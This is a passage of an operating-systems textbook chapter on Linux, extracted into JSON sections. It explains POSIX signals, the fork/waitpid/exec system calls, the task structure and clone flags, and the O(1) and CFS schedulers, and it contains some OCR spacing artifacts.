The\r\nchoices available are to ignore it, to catch it, or to let the signal kill the process.\r\nTerminatingthe process is the default for most signals. If a process elects to catch\r\nsignals sent to it, it must specify a signal-handling procedure. When a signal ar\u0002rives, control will abruptly switch to the handler. When the handler is finished and\r\nreturns, control goes back to where it came from, analogous to hardware I/O inter\u0002rupts. A process can send signals only to members of its process group, which\r\nconsists of its parent (and further ancestors), siblings, and children (and further\r\ndescendants). A process may also send a signal to all members of its process\r\ngroup with a single system call.\r\nSignals are also used for other purposes. For example, if a process is doing\r\nfloating-point arithmetic, and inadvertently divides by 0 (something that mathe\u0002maticians tend to frown upon), it gets a SIGFPE (floating-point exception) signal.\r\nSome of the signals that are required by POSIX are listed in Fig. 10-5. Many\r\nLinux systems have additional signals as well, but programs using them may not\r\nbe portable to other versions of Linux and UNIX in general.\n736 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nSignal Cause\r\nSIGABRT Sent to abort a process and force a core dump\r\nSIGALRM The alar m clock has gone off\r\nSIGFPE A floating-point error has occurred (e.g., division by 0)\r\nSIGHUP The phone line the process was using has been hung up\r\nSIGILL The user has hit the DEL key to interr upt the process\r\nSIGQUIT The user has hit the key requesting a core dump\r\nSIGKILL Sent to kill a process (cannot be caught or ignored)\r\nSIGPIPE The process has written to a pipe which has no readers\r\nSIGSEGV The process has referenced an invalid memory address\r\nSIGTERM Used to request that a process terminate gracefully\r\nSIGUSR1 Available for application-defined purposes\r\nSIGUSR2 Available for application-defined purposes\r\nFigure 10-5. Some of the signals required by POSIX."
          },
          "10.3.2 Process-Management System Calls in Linux": {
            "page": 767,
            "content": "10.3.2 Process-Management System Calls in Linux\r\nLet us now look at the Linux system calls dealing with process management.\r\nThe main ones are listed in Fig. 10-6. Fork is a good place to start the discussion.\r\nThe Fork system call, supported also by other traditional UNIX systems, is the\r\nmain way to create a new process in Linux systems. (We will discuss another alter\u0002native in the following section.) It creates an exact duplicate of the original proc\u0002ess, including all the file descriptors, registers, and everything else. After the fork,\r\nthe original process and the copy (the parent and child) go their separate ways. All\r\nthe variables have identical values at the time of the fork, but since the entire parent\r\naddress space is copied to create the child, subsequent changes in one of them do\r\nnot affect the other. The fork call returns a value, which is zero in the child, and\r\nequal to the child’s PID in the parent. Using the returned PID, the two processes\r\ncan see which is the parent and which is the child.\r\nIn most cases, after a fork, the child will need to execute different code from\r\nthe parent. Consider the case of the shell. It reads a command from the terminal,\r\nforks off a child process, waits for the child to execute the command, and then\r\nreads the next command when the child terminates. To wait for the child to finish,\r\nthe parent executes a waitpid system call, which just waits until the child terminates\r\n(any child if more than one exists). Waitpid has three parameters. The first one al\u0002lows the caller to wait for a specific child. If it is −1, any old child (i.e., the first\r\nchild to terminate) will do. The second parameter is the address of a variable that\r\nwill be set to the child’s exit status (normal or abnormal termination and exit\r\nvalue). This allows the parent to know the fate of its child. The third parameter\r\ndetermines whether the caller blocks or returns if no child is already terminated.\nSEC. 10.3 PROCESSES IN LINUX 737\r\nSystem call Description\r\npid = for k( ) Create a child process identical to the parent\r\npid = waitpid(pid, &statloc, opts) Wait for a child to terminate\r\ns = execve(name, argv, envp) Replace a process’ core image\r\nexit(status) Ter minate process execution and return status\r\ns = sigaction(sig, &act, &oldact) Define action to take on signals\r\ns = sigretur n(&context) Return from a signal\r\ns = sigprocmask(how, &set, &old) Examine or change the signal mask\r\ns = sigpending(set) Get the set of blocked signals\r\ns = sigsuspend(sigmask) Replace the signal mask and suspend the process\r\ns = kill(pid, sig) Send a signal to a process\r\nresidual = alarm(seconds) Set the alarm clock\r\ns = pause( ) Suspend the caller until the next signal\r\nFigure 10-6. Some system calls relating to processes. The return code s is −1 if\r\nan error has occurred, pid is a process ID, and residual is the remaining time in\r\nthe previous alarm. The parameters are what the names suggest.\r\nIn the case of the shell, the child process must execute the command typed by\r\nthe user. It does this by using the exec system call, which causes its entire core\r\nimage to be replaced by the file named in its first parameter. A highly simplified\r\nshell illustrating the use of fork, waitpid, and exec is shown in Fig. 10-7.\r\nIn the most general case, exec has three parameters: the name of the file to be\r\nexecuted, a pointer to the argument array, and a pointer to the environment array.\r\nThese will be described shortly. Various library procedures, such as execl, execv,\r\nexecle, and execve, are provided to allow the parameters to be omitted or specified\r\nin various ways. All of these procedures invoke the same underlying system call.\r\nAlthough the system call is exec, there is no library procedure with this name; one\r\nof the others must be used.\r\nLet us consider the case of a command typed to the shell, such as\r\ncp file1 file2\r\nused to copy file1 to file2. After the shell has forked, the child locates and executes\r\nthe file cp and passes it information about the files to be copied.\r\nThe main program of cp (and many other programs) contains the function dec\u0002laration\r\nmain(argc, argv, envp)\r\nwhere argc is a count of the number of items on the command line, including the\r\nprogram name. For the example above, argc is 3.\r\nThe second parameter, argv, is a pointer to an array. Element i of that array is a\r\npointer to the ith string on the command line. In our example, argv[0] would point\n738 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nwhile (TRUE) { /* repeat forever /*/\r\ntype prompt( ); /* display prompt on the screen */\r\nread command(command, params); /* read input line from keyboard */\r\npid = for k( ); /* fork off a child process */\r\nif (pid < 0) {\r\npr intf(\"Unable to for k0); /* error condition */\r\ncontinue; /* repeat the loop */\r\n}\r\nif (pid != 0) {\r\nwaitpid (−1, &status, 0); /* parent waits for child */\r\n} else {\r\nexecve(command, params, 0); /* child does the wor k */\r\n}\r\n}\r\nFigure 10-7. A highly simplified shell.\r\nto the two-character string ‘‘cp’’. Similarly, argv[1] would point to the fiv e-charac\u0002ter string ‘‘file1’’ and argv[2] would point to the fiv e-character string ‘‘file2’’.\r\nThe third parameter of main, envp, is a pointer to the environment, an array of\r\nstrings containing assignments of the form name = value used to pass information\r\nsuch as the terminal type and home directory name to a program. In Fig. 10-7, no\r\nenvironment is passed to the child, so that the third parameter of execve is a zero in\r\nthis case.\r\nIf exec seems complicated, do not despair; it is the most complex system call.\r\nAll the rest are much simpler. As an example of a simple one, consider exit, which\r\nprocesses should use when they are finished executing. It has one parameter, the\r\nexit status (0 to 255), which is returned to the parent in the variable status of the\r\nwaitpid system call. The low-order byte of status contains the termination status,\r\nwith 0 being normal termination and the other values being various error condi\u0002tions. The high-order byte contains the child’s exit status (0 to 255), as specified in\r\nthe child’s call to exit. For example, if a parent process executes the statement\r\nn = waitpid(−1, &status, 0);\r\nit will be suspended until some child process terminates. If the child exits with,\r\nsay, 4 as the parameter to exit, the parent will be awakened with n set to the child’s\r\nPID and status set to 0x0400 (0x as a prefix means hexadecimal in C). The low\u0002order byte of status relates to signals; the next one is the value the child returned in\r\nits call to exit.\r\nIf a process exits and its parent has not yet waited for it, the process enters a\r\nkind of suspended animation called the zombie state—the living dead. When the\r\nparent finally waits for it, the process terminates.\nSEC. 10.3 PROCESSES IN LINUX 739\r\nSeveral system calls relate to signals, which are used in a variety of ways. For\r\nexample, if a user accidentally tells a text editor to display the entire contents of a\r\nvery long file, and then realizes the error, some way is needed to interrupt the edi\u0002tor. The usual choice is for the user to hit some special key (e.g., DEL or CTRL\u0002C), which sends a signal to the editor. The editor catches the signal and stops the\r\nprint-out.\r\nTo announce its willingness to catch this (or any other) signal, the process can\r\nuse the sigaction system call. The first parameter is the signal to be caught (see\r\nFig. 10-5). The second is a pointer to a structure giving a pointer to the signal-han\u0002dling procedure, as well as some other bits and flags. The third one points to a\r\nstructure where the system returns information about signal handling currently in\r\neffect, in case it must be restored later.\r\nThe signal handler may run for as long as it wants to. In practice, though, sig\u0002nal handlers are usually fairly short. When the signal-handling procedure is done,\r\nit returns to the point from which it was interrupted.\r\nThe sigaction system call can also be used to cause a signal to be ignored, or to\r\nrestore the default action, which is killing the process.\r\nHitting the DEL key is not the only way to send a signal. The kill system call\r\nallows a process to signal another related process. The choice of the name ‘‘kill’’\r\nfor this system call is not an especially good one, since most processes send signals\r\nto other ones with the intention that they be caught. However, a signal that is not\r\ncaught, does, indeed, kill the recipient.\r\nFor many real-time applications, a process needs to be interrupted after a spe\u0002cific time interval to do something, such as to retransmit a potentially lost packet\r\nover an unreliable communication line. To handle this situation, the alar m system\r\ncall has been provided. The parameter specifies an interval, in seconds, after which\r\na SIGALRM signal is sent to the process. A process may have only one alarm out\u0002standing at any instant. If an alar m call is made with a parameter of 10 seconds,\r\nand then 3 seconds later another alar m call is made with a parameter of 20 sec\u0002onds, only one signal will be generated, 20 seconds after the second call. The first\r\nsignal is canceled by the second call to alar m. If the parameter to alar m is zero,\r\nany pending alarm signal is canceled. If an alarm signal is not caught, the default\r\naction is taken and the signaled process is killed. Technically, alarm signals may be\r\nignored, but that is a pointless thing to do. Why would a program ask to be sig\u0002naled later on and then ignore the signal?\r\nIt sometimes occurs that a process has nothing to do until a signal arrives. For\r\nexample, consider a computer-aided instruction program that is testing reading\r\nspeed and comprehension. It displays some text on the screen and then calls alar m\r\nto signal it after 30 seconds. While the student is reading the text, the program has\r\nnothing to do. It could sit in a tight loop doing nothing, but that would waste CPU\r\ntime that a background process or other user might need. A better solution is to\r\nuse the pause system call, which tells Linux to suspend the process until the next\r\nsignal arrives. Woe be it to the program that calls pause with no alarm pending.\n740 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10"
          },
          "10.3.3 Implementation of Processes and Threads in Linux": {
            "page": 771,
            "content": "10.3.3 Implementation of Processes and Threads in Linux\r\nA process in Linux is like an iceberg: you only see the part above the water,\r\nbut there is also an important part underneath. Every process has a user part that\r\nruns the user program. However, when one of its threads makes a system call, it\r\ntraps to kernel mode and begins running in kernel context, with a different memory\r\nmap and full access to all machine resources. It is still the same thread, but now\r\nwith more power and also its own kernel mode stack and kernel mode program\r\ncounter. These are important because a system call can block partway through, for\r\nexample, waiting for a disk operation to complete. The program counter and regis\u0002ters are then saved so the thread can be restarted in kernel mode later.\r\nThe Linux kernel internally represents processes as tasks, via the structure\r\ntask struct. Unlike other OS approaches (which make a distinction between a\r\nprocess, lightweight process, and thread), Linux uses the task structure to represent\r\nany execution context. Therefore, a single-threaded process will be represented\r\nwith one task structure and a multithreaded process will have one task structure for\r\neach of the user-level threads. Finally, the kernel itself is multithreaded, and has\r\nkernel-level threads which are not associated with any user process and are execut\u0002ing kernel code. We will return to the treatment of multithreaded processes (and\r\nthreads in general) later in this section.\r\nFor each process, a process descriptor of type task struct is resident in memo\u0002ry at all times. It contains vital information needed for the kernel’s management of\r\nall processes, including scheduling parameters, lists of open-file descriptors, and so\r\non. The process descriptor along with memory for the kernel-mode stack for the\r\nprocess are created upon process creation.\r\nFor compatibility with other UNIX systems, Linux identifies processes via the\r\nPID. The kernel organizes all processes in a doubly linked list of task structures.\r\nIn addition to accessing process descriptors by traversing the linked lists, the PID\r\ncan be mapped to the address of the task structure, and the process information can\r\nbe accessed immediately.\r\nThe task structure contains a variety of fields. Some of these fields contain\r\npointers to other data structures or segments, such as those containing information\r\nabout open files. Some of these segments are related to the user-level structure of\r\nthe process, which is not of interest when the user process is not runnable. There\u0002fore, these may be swapped or paged out, in order not to waste memory on infor\u0002mation that is not needed. For example, although it is possible for a process to be\r\nsent a signal while it is swapped out, it is not possible for it to read a file. For this\r\nreason, information about signals must be in memory all the time, even when the\r\nprocess is not present in memory. On the other hand, information about file de\u0002scriptors can be kept in the user structure and brought in only when the process is\r\nin memory and runnable.\r\nThe information in the process descriptor falls into a number of broad cate\u0002gories that can be roughly described as follows:\nSEC. 10.3 PROCESSES IN LINUX 741\r\n1. Scheduling parameters. Process priority, amount of CPU time con\u0002sumed recently, amount of time spent sleeping recently. Together,\r\nthese are used to determine which process to run next.\r\n2. Memory image. Pointers to the text, data, and stack segments, or\r\npage tables. If the text segment is shared, the text pointer points to the\r\nshared text table. When the process is not in memory, information\r\nabout how to find its parts on disk is here too.\r\n3. Signals. Masks showing which signals are being ignored, which are\r\nbeing caught, which are being temporarily blocked, and which are in\r\nthe process of being delivered.\r\n4. Machine registers. When a trap to the kernel occurs, the machine\r\nregisters (including the floating-point ones, if used) are saved here.\r\n5. System call state. Information about the current system call, includ\u0002ing the parameters, and results.\r\n6. File descriptor table. When a system call involving a file descriptor\r\nis invoked, the file descriptor is used as an index into this table to\r\nlocate the in-core data structure (i-node) corresponding to this file.\r\n7. Accounting. Pointer to a table that keeps track of the user and system\r\nCPU time used by the process. Some systems also maintain limits\r\nhere on the amount of CPU time a process may use, the maximum\r\nsize of its stack, the number of page frames it may consume, and\r\nother items.\r\n8. Kernel stack. A fixed stack for use by the kernel part of the process.\r\n9. Miscellaneous. Current process state, event being waited for, if any,\r\ntime until alarm clock goes off, PID, PID of the parent process, and\r\nuser and group identification.\r\nKeeping this information in mind, it is now easy to explain how processes are\r\ncreated in Linux. The mechanism for creating a new process is actually fairly\r\nstraightforward. A new process descriptor and user area are created for the child\r\nprocess and filled in largely from the parent. The child is given a PID, its memory\r\nmap is set up, and it is given shared access to its parent’s files. Then its registers\r\nare set up and it is ready to run.\r\nWhen a fork system call is executed, the calling process traps to the kernel and\r\ncreates a task structure and few other accompanying data structures, such as the\r\nkernel-mode stack and a thread info structure. This structure is allocated at a fixed\r\noffset from the process’ end-of-stack, and contains few process parameters, along\n742 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nwith the address of the process descriptor. By storing the process descriptor’s ad\u0002dress at a fixed location, Linux needs only few eff icient operations to locate the\r\ntask structure for a running process.\r\nThe majority of the process-descriptor contents are filled out based on the par\u0002ent’s descriptor values. Linux then looks for an available PID, that is, not one cur\u0002rently in use by any process, and updates the PID hash-table entry to point to the\r\nnew task structure. In case of collisions in the hash table, process descriptors may\r\nbe chained. It also sets the fields in the task struct to point to the corresponding\r\nprevious/next process on the task array.\r\nIn principle, it should now allocate memory for the child’s data and stack seg\u0002ments, and to make exact copies of the parent’s segments, since the semantics of\r\nfork say that no memory is shared between parent and child. The text segment may\r\nbe either copied or shared since it is read only. At this point, the child is ready to\r\nrun.\r\nHowever, copying memory is expensive, so all modern Linux systems cheat.\r\nThey giv e the child its own page tables, but have them point to the parent’s pages,\r\nonly marked read only. Whenever either process (the child or the parent) tries to\r\nwrite on a page, it gets a protection fault. The kernel sees this and then allocates a\r\nnew copy of the page to the faulting process and marks it read/write. In this way,\r\nonly pages that are actually written have to be copied. This mechanism is called\r\ncopy on write. It has the additional benefit of not requiring two copies of the pro\u0002gram in memory, thus saving RAM.\r\nAfter the child process starts running, the code running there (a copy of the\r\nshell in our example) does an exec system call giving the command name as a pa\u0002rameter. The kernel now finds and verifies the executable file, copies the arguments\r\nand environment strings to the kernel, and releases the old address space and its\r\npage tables.\r\nNow the new address space must be created and filled in. If the system sup\u0002ports mapped files, as Linux and virtually all other UNIX-based systems do, the\r\nnew page tables are set up to indicate that no pages are in memory, except perhaps\r\none stack page, but that the address space is backed by the executable file on disk.\r\nWhen the new process starts running, it will immediately get a page fault, which\r\nwill cause the first page of code to be paged in from the executable file. In this\r\nway, nothing has to be loaded in advance, so programs can start quickly and fault\r\nin just those pages they need and no more. (This strategy is really just demand\r\npaging in its most pure form, as we discussed in Chap. 3.) Finally, the arguments\r\nand environment strings are copied to the new stack, the signals are reset, and the\r\nregisters are initialized to all zeros. At this point, the new command can start run\u0002ning.\r\nFigure 10-8 illustrates the steps described above through the following ex\u0002ample: A user types a command, ls, on the terminal, the shell creates a new process\r\nby forking off a clone of itself. The new shell then calls exec to overlay its memory\r\nwith the contents of the executable file ls. After that, ls can start.\nSEC. 10.3 PROCESSES IN LINUX 743\r\nsh sh ls\r\nfork code\r\nNew process Same process\r\n1. Fork call 3. exec call\r\n 4. sh overlaid\r\nwith ls\r\nPID = 501 PID = 748 PID = 748\r\nAllocate child’s task structure \r\nFill child’s task structure from parent\r\nAllocate child’s stack and user area\r\nFill child’s user area from parent\r\nAllocate PID for child\r\nSet up child to share parent’s text\r\nCopy page tables for data and stack\r\nSet up sharing of open files\r\nCopy parent’s registers to child\r\nFind the executable program\r\nVerify the execute permission\r\nRead and verify the header\r\nCopy arguments, environ to kernel\r\nFree the old address space\r\nAllocate new address space\r\nCopy arguments, environ to stack\r\nReset signals\r\nInitialize registers\r\nexec code\r\n2. New sh\r\n created\r\nFigure 10-8. The steps in executing the command ls typed to the shell.\r\nThreads in Linux\r\nWe discussed threads in a general way in Chap. 2. Here we will focus on ker\u0002nel threads in Linux, particularly on the differences among the Linux thread model\r\nand other UNIX systems. In order to better understand the unique capabilities pro\u0002vided by the Linux model, we start with a discussion of some of the challenging\r\ndecisions present in multithreaded systems.\r\nThe main issue in introducing threads is maintaining the correct traditional\r\nUNIX semantics. First consider fork. Suppose that a process with multiple (kernel)\r\nthreads does a fork system call. Should all the other threads be created in the new\r\nprocess? For the moment, let us answer that question with yes. Suppose that one\r\nof the other threads was blocked reading from the keyboard. Should the corres\u0002ponding thread in the new process also be blocked reading from the keyboard? If\r\nso, which one gets the next line typed? If not, what should that thread be doing in\r\nthe new process?\r\nThe same problem holds for many other things threads can do. In a sin\u0002gle-threaded process, the problem does not arise because the one and only thread\r\ncannot be blocked when calling fork. Now consider the case that the other threads\r\nare not created in the child process. Suppose that one of the not-created threads\r\nholds a mutex that the one-and-only thread in the new process tries to acquire after\r\ndoing the fork. The mutex will never be released and the one thread will hang for\u0002ev er. Numerous other problems exist, too. There is no simple solution.\n744 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nFile I/O is another problem area. Suppose that one thread is blocked reading\r\nfrom a file and another thread closes the file or does an lseek to change the current\r\nfile pointer. What happens next? Who knows?\r\nSignal handling is another thorny issue. Should signals be directed at a specific\r\nthread or just at the process? A SIGFPE (floating-point exception) should proba\u0002bly be caught by the thread that caused it. What if it does not catch it? Should just\r\nthat thread be killed, or all threads? Now consider the SIGINT signal, generated\r\nby the user at the keyboard. Which thread should catch that? Should all threads\r\nshare a common set of signal masks? All solutions to these and other problems\r\nusually cause something to break somewhere. Getting the semantics of threads\r\nright (not to mention the code) is a nontrivial business.\r\nLinux supports kernel threads in an interesting way that is worth looking at.\r\nThe implementation is based on ideas from 4.4BSD, but kernel threads were not\r\nenabled in that distribution because Berkeley ran out of money before the C library\r\ncould be rewritten to solve the problems discussed above.\r\nHistorically, processes were resource containers and threads were the units of\r\nexecution. A process contained one or more threads that shared the address space,\r\nopen files, signal handlers, alarms, and everything else. Everything was clear and\r\nsimple as described above.\r\nIn 2000, Linux introduced a powerful new system call, clone, that blurred the\r\ndistinction between processes and threads and possibly even inv erted the primacy\r\nof the two concepts. Clone is not present in any other version of UNIX. Classi\u0002cally, when a new thread was created, the original thread(s) and the new one shared\r\nev erything but their registers. In particular, file descriptors for open files, signal\r\nhandlers, alarms, and other global properties were per process, not per thread.\r\nWhat clone did was make it possible for each of these aspects and others to be\r\nprocess specific or thread specific. It is called as follows:\r\npid = clone(function, stack ptr, shar ing flags, arg);\r\nThe call creates a new thread, either in the current process or in a new process, de\u0002pending on sharing flags. If the new thread is in the current process, it shares the\r\naddress space with the existing threads, and every subsequent write to any byte in\r\nthe address space by any thread is immediately visible to all the other threads in\r\nthe process. On the other hand, if the address space is not shared, then the new\r\nthread gets an exact copy of the address space, but subsequent writes by the new\r\nthread are not visible to the old ones. These semantics are the same as POSIX fork.\r\nIn both cases, the new thread begins executing at function, which is called with\r\narg as its only parameter. Also in both cases, the new thread gets its own private\r\nstack, with the stack pointer initialized to stack ptr.\r\nThe sharing flags parameter is a bitmap that allows a finer grain of sharing\r\nthan traditional UNIX systems. Each of the bits can be set independently of the\r\nother ones, and each of them determines whether the new thread copies some data\nSEC. 10.3 PROCESSES IN LINUX 745\r\nstructure or shares it with the calling thread. Fig. 10-9 shows some of the items\r\nthat can be shared or copied according to bits in sharing flags.\r\nFlag Meaning when set Meaning when cleared\r\nCLONE VM Create a new thread Create a new process\r\nCLONE FS Share umask, root, and wor king dirs Do not share them\r\nCLONE FILES Share the file descriptors Copy the file descriptors\r\nCLONE SIGHAND Share the signal handler table Copy the table\r\nCLONE PARENT New thread has same parent as the caller New thread’s parent is caller\r\nFigure 10-9. Bits in the sharing flags bitmap.\r\nThe CLONE VM bit determines whether the virtual memory (i.e., address\r\nspace) is shared with the old threads or copied. If it is set, the new thread just\r\nmoves in with the existing ones, so the clone call effectively creates a new thread\r\nin an existing process. If the bit is cleared, the new thread gets its own private ad\u0002dress space. Having its own address space means that the effect of its STORE in\u0002structions is not visible to the existing threads. This behavior is similar to fork, ex\u0002cept as noted below. Creating a new address space is effectively the definition of a\r\nnew process.\r\nThe CLONE FS bit controls sharing of the root and working directories and of\r\nthe umask flag. Even if the new thread has its own address space, if this bit is set,\r\nthe old and new threads share working directories. This means that a call to chdir\r\nby one thread changes the working directory of the other thread, even though the\r\nother thread may have its own address space. In UNIX, a call to chdir by a thread\r\nalways changes the working directory for other threads in its process, but never for\r\nthreads in another process. Thus this bit enables a kind of sharing not possible in\r\ntraditional UNIX versions.\r\nThe CLONE FILES bit is analogous to the CLONE FS bit. If set, the new\r\nthread shares its file descriptors with the old ones, so calls to lseek by one thread\r\nare visible to the other ones, again as normally holds for threads within the same\r\nprocess but not for threads in different processes. Similarly, CLONE SIGHAND\r\nenables or disables the sharing of the signal handler table between the old and new\r\nthreads. If the table is shared, even among threads in different address spaces, then\r\nchanging a handler in one thread affects the handlers in the others.\r\nFinally, every process has a parent. The CLONE PARENT bit controls who the\r\nparent of the new thread is. It can either be the same as the calling thread (in\r\nwhich case the new thread is a sibling of the caller) or it can be the calling thread\r\nitself, in which case the new thread is a child of the caller. There are a few other\r\nbits that control other items, but they are less important.\r\nThis fine-grained sharing is possible because Linux maintains separate data\r\nstructures for the various items listed in Sec. 10.3.3 (scheduling parameters, mem\u0002ory image, and so on). The task structure just points to these data structures, so it\n746 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nis easy to make a new task structure for each cloned thread and have it point either\r\nto the old thread’s scheduling, memory, and other data structures or to copies of\r\nthem. The fact that such fine-grained sharing is possible does not mean that it is\r\nuseful, however, especially since traditional UNIX versions do not offer this func\u0002tionality. A Linux program that takes advantage of it is then no longer portable to\r\nUNIX.\r\nThe Linux thread model raises another difficulty. UNIX systems associate a\r\nsingle PID with a process, independent of whether it is single- or multithreaded. In\r\norder to be compatible with other UNIX systems, Linux distinguishes between a\r\nprocess identifier (PID) and a task identifier (TID). Both fields are stored in the\r\ntask structure. When clone is used to create a new process that shares nothing with\r\nits creator, PID is set to a new value; otherwise, the task receives a new TID, but\r\ninherits the PID. In this manner all threads in a process will receive the same PID\r\nas the first thread in the process."
          },
          "10.3.4 Scheduling in Linux": {
            "page": 777,
            "content": "10.3.4 Scheduling in Linux\r\nWe will now look at the Linux scheduling algorithm. To start with, Linux\r\nthreads are kernel threads, so scheduling is based on threads, not processes.\r\nLinux distinguishes three classes of threads for scheduling purposes:\r\n1. Real-time FIFO.\r\n2. Real-time round robin.\r\n3. Timesharing.\r\nReal-time FIFO threads are the highest priority and are not preemptable except by\r\na newly readied real-time FIFO thread with even higher priority. Real-time round\u0002robin threads are the same as real-time FIFO threads except that they hav e time\r\nquanta associated with them, and are preemptable by the clock. If multiple real\u0002time round-robin threads are ready, each one is run for its quantum, after which it\r\ngoes to the end of the list of real-time round-robin threads. Neither of these classes\r\nis actually real time in any sense. Deadlines cannot be specified and guarantees are\r\nnot given. These classes are simply higher priority than threads in the standard\r\ntimesharing class. The reason Linux calls them real time is that Linux is confor\u0002mant to the P1003.4 standard (‘‘real-time’’ extensions to UNIX) which uses those\r\nnames. The real-time threads are internally represented with priority levels from 0\r\nto 99, 0 being the highest and 99 the lowest real-time priority level.\r\nThe conventional, non-real-time threads form a separate class and are sched\u0002uled by a separate algorithm so they do not compete with the real-time threads. In\u0002ternally, these threads are associated with priority levels from 100 to 139, that is,\r\nLinux internally distinguishes among 140 priority levels (for real-time and non\u0002real-time tasks). As for the real-time round-robin threads, Linux allocates CPU\r\ntime to the non-real-time tasks based on their requirements and their priority levels.\nSEC. 10.3 PROCESSES IN LINUX 747\r\nIn Linux, time is measured as the number of clock ticks. In older Linux ver\u0002sions, the clock ran at 1000Hz and each tick was 1ms, called a jiffy. In newer ver\u0002sions, the tick frequency can be configured to 500, 250 or even 1Hz. In order to\r\navoid wasting CPU cycles for servicing the timer interrupt, the kernel can even be\r\nconfigured in ‘‘tickless’’ mode. This is useful when there is only one process run\u0002ning in the system, or when the CPU is idle and needs to go into power-saving\r\nmode. Finally, on newer systems, high-resolution timers allow the kernel to keep\r\ntrack of time in sub-jiffy granularity.\r\nLike most UNIX systems, Linux associates a nice value with each thread. The\r\ndefault is 0, but this can be changed using the nice(value) system call, where value\r\nranges from −20 to +19. This value determines the static priority of each thread. A\r\nuser computing π to a billion places in the background might put this call in his\r\nprogram to be nice to the other users. Only the system administrator may ask for\r\nbetter than normal service (meaning values from −20 to −1). Deducing the reason\r\nfor this rule is left as an exercise for the reader.\r\nNext, we will describe in more detail two of the Linux scheduling algorithms.\r\nTheir internals are closely related to the design of the runqueue, a key data struc\u0002ture used by the scheduler to track all runnable tasks in the system and select the\r\nnext one to run. A runqueue is associated with each CPU in the system.\r\nHistorically, a popular Linux scheduler was the Linux O(1) scheduler. It re\u0002ceived its name because it was able to perform task-management operations, such\r\nas selecting a task or enqueueing a task on the runqueue, in constant time, indepen\u0002dent of the total number of tasks in the system. In the O(1) scheduler, the run\u0002queue is organized in two arrays, active and expired. As shown in Fig. 10-10(a),\r\neach of these is an array of 140 list heads, each corresponding to a different prior\u0002ity. Each list head points to a doubly linked list of processes at a given priority.\r\nThe basic operation of the scheduler can be described as follows.\r\nThe scheduler selects a task from the highest-priority list in the active array. If\r\nthat task’s timeslice (quantum) expires, it is moved to the expired list (potentially\r\nat a different priority level). If the task blocks, for instance to wait on an I/O event,\r\nbefore its timeslice expires, once the event occurs and its execution can resume, it\r\nis placed back on the original active array, and its timeslice is decremented to\r\nreflect the CPU time it already used. Once its timeslice is fully exhausted, it, too,\r\nwill be placed on the expired array. When there are no more tasks in the active\r\narray, the scheduler simply swaps the pointers, so the expired arrays now become\r\nactive, and vice versa. This method ensures that low-priority tasks will not starve\r\n(except when real-time FIFO threads completely hog the CPU, which is unlikely).\r\nHere, different priority levels are assigned different timeslice values, with\r\nhigher quanta assigned to higher-priority processes. For instance, tasks running at\r\npriority level 100 will receive time quanta of 800 msec, whereas tasks at priority\r\nlevel of 139 will receive 5 msec.\r\nThe idea behind this scheme is to get processes out of the kernel fast. If a\r\nprocess is trying to read a disk file, making it wait a second between read calls will\n748 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nFlags\r\nCPU\r\nStatic_prio\r\n< >\r\nActive\r\nExpired\r\n< >\r\nPriority 0\r\nArray[0]\r\nPriority 139\r\nPriority 0\r\nArray[1]\r\nPriority 139\r\nP\r\nP\r\nP\r\nP P\r\nP\r\nP\r\nP\r\nP\r\nP P\r\nP\r\n(a) Per CPU runqueue in the \r\nLinux O(1) scheduler \r\n35\r\n26 47\r\n10 30 38 62\r\n3 27 45 86\r\nNIL NIL NIL NIL NIL NIL NIL\r\nNIL NIL NIL NIL\r\nNIL\r\n(b) Per CPU red-black tree in \r\nthe CFS scheduler\r\nFigure 10-10. Illustration of Linux runqueue data structures for (a) the Linux\r\nO(1) scheduler, and (b) the Completely Fair Scheduler.\r\nslow it down enormously. It is far better to let it run immediately after each re\u0002quest is completed, so that it can make the next one quickly. Similarly, if a process\r\nwas blocked waiting for keyboard input, it is clearly an interactive process, and as\r\nsuch should be given a high priority as soon as it is ready in order to ensure that\r\ninteractive processes get good service. In this light, CPU-bound processes basical\u0002ly get any service that is left over when all the I/O bound and interactive processes\r\nare blocked.\r\nSince Linux (or any other OS) does not know a priori whether a task is I/O- or\r\nCPU-bound, it relies on continuously maintaining interactivity heuristics. In this\r\nmanner, Linux distinguishes between static and dynamic priority. The threads’ dy\u0002namic priority is continuously recalculated, so as to (1) reward interactive threads,\r\nand (2) punish CPU-hogging threads. In the O(1) scheduler, the maximum priority\r\nbonus is −5, since lower-priority values correspond to higher priority received by\r\nthe scheduler. The maximum priority penalty is +5. The scheduler maintains a\r\nsleep avg variable associated with each task. Whenever a task is awakened, this\r\nvariable is incremented. Whenever a task is preempted or when its quantum ex\u0002pires, this variable is decremented by the corresponding value. This value is used\nSEC. 10.3 PROCESSES IN LINUX 749\r\nto dynamically map the task’s bonus to values from −5 to +5. The scheduler recal\u0002culates the new priority level as a thread is moved from the active to the expired\r\nlist.\r\nThe O(1) scheduling algorithm refers to the scheduler made popular in the\r\nearly versions of the 2.6 kernel, and was first introduced in the unstable 2.5 kernel.\r\nPrior algorithms exhibited poor performance in multiprocessor settings and did not\r\nscale well with an increased number of tasks. Since the description presented in the\r\nabove paragraphs indicates that a scheduling decision can be made through access\r\nto the appropriate active list, it can be done in constant O(1) time, independent of\r\nthe number of processes in the system. However, in spite of the desirable property\r\nof constant-time operation, the O(1) scheduler had significant shortcomings. Most\r\nnotably, the heuristics used to determine the interactivity of a task, and therefore its\r\npriority level, were complex and imperfect, and resulted in poor performance for\r\ninteractive tasks.\r\nTo address this issue, Ingo Molnar, who also created the O(1) scheduler, pro\u0002posed a new scheduler called Completely Fair Scheduler or CFS. CFS was\r\nbased on ideas originally developed by Con Kolivas for an earlier scheduler, and\r\nwas first integrated into the 2.6.23 release of the kernel. It is still the default sched\u0002uler for the non-real-time tasks.\r\nThe main idea behind CFS is to use a red-black tree as the runqueue data struc\u0002ture. Tasks are ordered in the tree based on the amount of time they spend running\r\non the CPU, called vruntime. CFS accounts for the tasks’ running time with\r\nnanosecond granularity. As shown in Fig. 10-10(b), each internal node in the tree\r\ncorresponds to a task. The children to the left correspond to tasks which had less\r\ntime on the CPU, and therefore will be scheduled sooner, and the children to the\r\nright on the node are those that have consumed more CPU time thus far. The\r\nleaves in the tree do not play any role in the scheduler.\r\nThe scheduling 